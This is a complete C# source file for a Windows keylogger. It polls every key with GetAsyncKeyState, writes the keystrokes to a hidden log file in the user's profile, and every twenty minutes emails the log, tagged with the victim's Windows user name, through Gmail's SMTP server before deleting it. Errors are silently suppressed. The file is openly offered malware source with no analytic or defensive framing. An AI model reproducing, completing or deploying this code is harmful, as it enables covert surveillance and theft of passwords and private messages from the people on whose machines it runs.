using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Timers;

namespace KeyLogger
{
    class Program
    {
        private string path = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Log.txt";

        private Dictionary<int, string> KeysDictionary = new Dictionary<int, string>()
        {
            { 8, "[Back]" },
            { 9, "[TAB]" },
            { 13, "[Enter]" },
            { 19, "[Pause]" },
            { 20, "[Caps Lock]" },
            { 27, "[Esc]" },
            { 32, "[Space]" },
            { 33, "[Page Up]" },
            { 34, "[Page Down]" },
            { 35, "[End]" },
            { 36, "[Home]" },
            { 37, "[Left]" },
            { 38, "[Up]" },
            { 39, "[Right]" },
            { 40, "[Down]" },
            { 44, "[Print Screen]" },
            { 45, "[Insert]" },
            { 46, "[Delete]" },
            { 48, "0" },
            { 49, "1" },
            { 50, "2" },
            { 51, "3" },
            { 52, "4" },
            { 53, "5" },
            { 54, "6" },
            { 55, "7" },
            { 56, "8" },
            { 57, "9" },
            { 65, "a" },
            { 66, "b" },
            { 67, "c" },
            { 68, "d" },
            { 69, "e" },
            { 70, "f" },
            { 71, "g" },
            { 72, "h" },
            { 73, "i" },
            { 74, "j" },
            { 75, "k" },
            { 76, "l" },
            { 77, "m" },
            { 78, "n" },
            { 79, "o" },
            { 80, "p" },
            { 81, "q" },
            { 82, "r" },
            { 83, "s" },
            { 84, "t" },
            { 85, "u" },
            { 86, "v" },
            { 87, "w" },
            { 88, "x" },
            { 89, "y" },
            { 90, "z" },
            { 91, "[Windows]" },
            { 92, "[Windows]" },
            { 93, "[List]" },
            { 96, "0" },
            { 97, "1" },
            { 98, "2" },
            { 99, "3" },
            { 100, "4" },
            { 101, "5" },
            { 102, "6" },
            { 103, "7" },
            { 104, "8" },
            { 105, "9" },
            { 106, "*" },
            { 107, "+" },
            { 109, "-" },
            { 110, "," },
            { 111, "/" },
            { 112, "[F1]" },
            { 113, "[F2]" },
            { 114, "[F3]" },
            { 115, "[F4]" },
            { 116, "[F5]" },
            { 117, "[F6]" },
            { 118, "[F7]" },
            { 119, "[F8]" },
            { 120, "[F9]" },
            { 121, "[F10]" },
            { 122, "[F11]" },
            { 123, "[F12]" },
            { 144, "[Num Lock]" },
            { 145, "[Scroll Lock]" },
            { 160, "[Shift]" },
            { 161, "[Shift]" },
            { 162, "[Ctrl]" },
            { 163, "[Ctrl]" },
            { 164, "[Alt]" },
            { 165, "[Alt]" },
            { 186, "ç" },
            { 187, "=" },
            { 188, "," },
            { 189, "-" },
            { 190, "." },
            { 191, ";" },
            { 192, "'" },
            { 193, "/" },
            { 194, "." },
            { 219, "´" },
            { 220, "]" },
            { 221, "[" },
            { 222, "~" },
            { 226, "\\" }
        };

        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        static void Main(string[] args)
        {
            new Program().start();
        }

        private void start()
        {
            if (File.Exists(path)) File.SetAttributes(path, FileAttributes.Hidden);
            Timer t = new Timer();
            t.Interval = 60000 * 20;
            t.Elapsed += sendEmail;
            t.AutoReset = true;
            t.Enabled = true;

            while (true)
            {
                for (int i = 0; i < 255; i++)
                {
                    int key = GetAsyncKeyState(i);
                    if (key == 1 || key == -32767)
                    {
                        StreamWriter file = new StreamWriter(path, true);
                        File.SetAttributes(path, FileAttributes.Hidden);
                        file.Write(verifyKey(i));
                        file.Close();
                        break;
                    }
                }
            }
        }

        private string verifyKey(int code)
        {
            return KeysDictionary.ContainsKey(code) ? KeysDictionary[code] : "[" + code + "]";
        }

        private void sendEmail(object source, ElapsedEventArgs e)
        {
            try
            {
                MailMessage mail = new MailMessage();
                SmtpClient server = new SmtpClient("smtp.gmail.com");

                mail.From = new MailAddress("email");
                mail.To.Add("dest");
                mail.Subject = "Log: " + WindowsIdentity.GetCurrent().Name;

                if (!File.Exists(path)) return;
                StreamReader r = new StreamReader(path);
                string content = r.ReadLine();
                r.Close();
                File.Delete(path);
                mail.Body = content;

                server.Port = 587;
                server.Credentials = new NetworkCredential("email", "password");
                server.EnableSsl = true;
                server.Send(mail);
            }
            catch (Exception ex)
            {
            }
        }
    }
}